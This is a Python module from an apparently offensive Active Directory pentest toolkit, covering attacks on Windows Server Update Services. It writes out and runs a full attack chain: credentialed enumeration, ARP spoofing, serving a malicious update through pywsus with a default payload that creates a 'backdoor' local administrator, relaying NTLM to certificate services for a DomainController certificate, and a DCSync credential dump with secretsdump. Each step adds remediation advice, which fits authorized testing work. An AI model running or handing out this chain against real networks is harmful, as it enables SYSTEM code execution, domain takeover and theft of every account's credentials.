"""
Module: WSUS Spoofing & Pre2K / MachineAccountQuota Attacks
Techniques:
  - WSUS HTTP spoofing (pywsus) → SYSTEM code execution
  - WSUS + ADCS ESC8 relay chain
  - Identify WSUS servers and HTTP vs HTTPS config
"""
from utils.helpers import *
from config.settings import SESSION

MENU = """
  ── WSUS ATTACK ─────────────────────────────────────────────────
  [1]  Enumerate WSUS Servers          (GPO / registry / LDAP)
  [2]  WSUS HTTP Spoofing              (pywsus → SYSTEM)
  [3]  WSUS + NTLM Relay to ADCS       (ESC8 chain)
  [4]  wsuxploit / WSUSpect            (alternative tools)
  [0]  Back
"""


def run():
    print_banner("WSUS ATTACK", "Windows Update MITM → SYSTEM Code Execution")
    dc      = input_or_session("dc_ip",        "DC IP")
    dom     = input_or_session("domain",        "Domain")
    user    = input_or_session("username",      "Username")
    pw      = input_or_session("password",      "Password")
    attacker = input_or_session("attacker_ip", "Attacker IP")
    iface = SESSION.get("attacker_iface") or "<INTERFACE>"

    base_dn = "DC=" + dom.replace(".", ",DC=")
    ldap_b  = f"ldapsearch -x -H ldaps://{dc}:636 -D '{user}@{dom}' -w '{pw}' -b '{base_dn}'"

    print(MENU)
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] Enumerate WSUS ────────────────────────────────────────────────────
    if c == "1":
        info("Searching for WSUS server via GPO and LDAP...")
        out = run_cmd(
            f"{ldap_b} '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath",
            capture=True)
        save_result(out, "wsus_gpo_search.txt", "enum")
        # Check registry via nxc
        run_cmd(f"nxc smb {dc} -u '{user}' -p '{pw}' -d {dom} "
                f"--reg query 'HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate' "
                f"WUServer 2>/dev/null")
        print(f"""
  {NEON_CYN}Manual WSUS detection methods:{RST}
  # Check WSUS via GPO
  nxc smb {dc} -u '{user}' -p '{pw}' -d {dom} -M gpp_autologin
  nxc smb {dc} -u '{user}' -p '{pw}' -d {dom} --spider SYSVOL --content --pattern WSUS

  # Check registry on domain machines
  reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer
  # If value starts with http:// (not https://) → VULNERABLE

  # Via LDAP GPO search
  grep -i "wsus\\|WUServer\\|windowsupdate" /tmp/wsus_gpo_search.txt
""")

    # ── [2] WSUS HTTP spoofing ────────────────────────────────────────────────
    elif c == "2":
        wsus_port = prompt("WSUS HTTP port (default 8530)") or "8530"
        payload   = prompt("Command to execute (default: add local admin)") or \
                    f"net user backdoor P@ss123! /add && net localgroup administrators backdoor /add"
        print(f"""
  {NEON_CYN}WSUS HTTP Spoofing with pywsus:{RST}
  {DIM}Position yourself as MITM (ARP spoof, DHCPv6, etc.) between
  victim and WSUS server. Intercept HTTP update traffic.
  Serve a malicious MSU/CAB update → executes as SYSTEM on reboot/update.{RST}

  ── Prerequisites ────────────────────────────────────────────────────────
  - ARP spoof or MITM position between victim and WSUS server
  - WSUS uses HTTP (not HTTPS) → check port {wsus_port}
  - pywsus installed: git clone https://github.com/GoSecure/pywsus /opt/pywsus

  ── Step 1: ARP spoof victim → WSUS ──────────────────────────────────────
  # Identify victim IP and WSUS IP from registry/GPO
  arpspoof -i {iface} -t <VICTIM_IP> <WSUS_IP>
  arpspoof -i {iface} -t <WSUS_IP> <VICTIM_IP>

  ── Step 2: Start pywsus ─────────────────────────────────────────────────
  sudo python3 /opt/pywsus/pywsus.py \\
    --host {attacker} \\
    --port {wsus_port} \\
    --executable /tmp/malicious_update.exe \\
    --command '{payload}'

  ── Step 3: Wait for victim to check for updates ─────────────────────────
  # Or trigger manually if you have WMI/WinRM access:
  wuauclt.exe /detectnow
  # OR:
  UsoClient.exe StartScan

  ── Malicious MSU creation ────────────────────────────────────────────────
  # pywsus creates the fake update automatically
  # or use wsuxploit for pre-built payloads
""")
        run_cmd("git clone https://github.com/GoSecure/pywsus /opt/pywsus 2>/dev/null || "
                "echo 'pywsus already installed at /opt/pywsus'")
        add_finding("WSUS HTTP Spoofing Vector", "High",
                    "WSUS server configured with HTTP — MITM code execution possible",
                    "Configure WSUS with HTTPS; enable TLS certificate validation for updates")

    # ── [3] WSUS + ADCS ESC8 relay ────────────────────────────────────────────
    elif c == "3":
        print(f"""
  {NEON_CYN}WSUS + NTLM Relay to ADCS (ESC8 Chain):{RST}
  {DIM}When WSUS uses HTTP, the machine authenticates via NTLM during
  update download. Relay that NTLM auth to ADCS HTTP endpoint for
  a machine certificate → use for PKINIT → DA.{RST}

  ── Step 1: Verify ADCS has HTTP enrollment ──────────────────────────────
  curl http://{dc}/certsrv/ -I  # 401 = NTLM auth = vulnerable to ESC8

  ── Step 2: Start relay ───────────────────────────────────────────────────
  sudo {imp('ntlmrelayx.py')} \\
    -t http://{dc}/certsrv/certfnsh.asp \\
    -smb2support --adcs --template DomainController

  ── Step 3: Trigger WSUS check (ARP spoof in background) ─────────────────
  # WSUS HTTP auth → relayed → machine cert issued
  # Use machine cert for PKINIT → silver/golden ticket or DCSync

  ── Step 4: Authenticate with machine cert ────────────────────────────────
  certipy auth -pfx dc01.pfx -domain {dom} -dc-ip {dc}
  export KRB5CCNAME=dc01.ccache
  # DCSync:
  {imp('secretsdump.py')} -k -no-pass {dom}/DC01$@{dc}
""")
        add_finding("WSUS + ESC8 Relay Chain", "Critical",
                    "WSUS HTTP auth relayed to ADCS → machine cert → DCSync path",
                    "Enable HTTPS on WSUS; enable ADCS EPA; configure LDAP signing")

    # ── [4] wsuxploit ────────────────────────────────────────────────────────
    elif c == "4":
        print(f"""
  {NEON_CYN}Alternative WSUS Attack Tools:{RST}

  ── wsuxploit ────────────────────────────────────────────────────────────
  git clone https://github.com/pimps/wsuxploit /opt/wsuxploit
  sudo ruby /opt/wsuxploit/wsuxploit.rb \\
    <WSUS_SERVER_IP> {attacker} {wsus_port if 'wsus_port' in dir() else '8530'}

  ── WSUSpect Proxy ───────────────────────────────────────────────────────
  git clone https://github.com/ctxis/wsuspect-proxy /opt/wsuspect
  python2 /opt/wsuspect/WSUSpect_proxy.py \\
    -u http://<WSUS_SERVER>:{wsus_port if 'wsus_port' in dir() else '8530'}/

  ── wsuks ────────────────────────────────────────────────────────────────
  pip3 install wsuks
  wsuks -t <WSUS_SERVER_IP>
""")

    pause()
